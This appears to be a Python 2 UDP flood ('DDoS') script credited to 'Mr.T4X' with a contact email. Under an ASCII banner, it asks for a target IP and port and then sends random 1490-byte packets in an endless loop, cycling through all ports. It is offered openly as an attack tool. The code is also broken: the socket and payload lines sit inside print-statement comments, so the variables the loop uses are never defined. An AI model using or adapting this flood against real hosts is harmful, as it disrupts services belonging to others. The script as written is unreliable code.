print #Ddos by Mr.T4X
print #Mari Ber Senang-Senang Gans :D
print #Hub: ("anonymoushackercyber@gmail.com")

import os
import sys
import socket
import random

print #SET SOCK AND RANDOM
print ###########################################################
print # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #
print # bytes = random._urandom(1490)                           #
print ###########################################################

print os.system("clear")
print
print "\033[37;1m			>//< Author Mr.T4X >//<                      "
print
print "    _  _  _  _                _                                  "
print "   (_)(_)(_)(_)              (_)                                 "
print "    (_)      (_)_    _  _  _ (_)    _  _  _       _  _  _  _     "
print "    (_)        (_) _(_)(_)(_)(_) _ (_)(_)(_) _  _(_)(_)(_)(_)    "
print "    (_)        (_)(_)        (_)(_)         (_)(_)_  _  _  _     "
print "    (_)       _(_)(_)        (_)(_)         (_)  (_)(_)(_)(_)_   "
print "    (_)_  _  (_)  (_)_  _  _ (_)(_) _  _  _ (_)   _  _  _  _(_)  "
print "   (_)(_)(_)(_)     (_)(_)(_)(_)   (_)(_)(_)     (_)(_)(_)(_)    "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[32;1mSent %s packet to %s sampe down port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
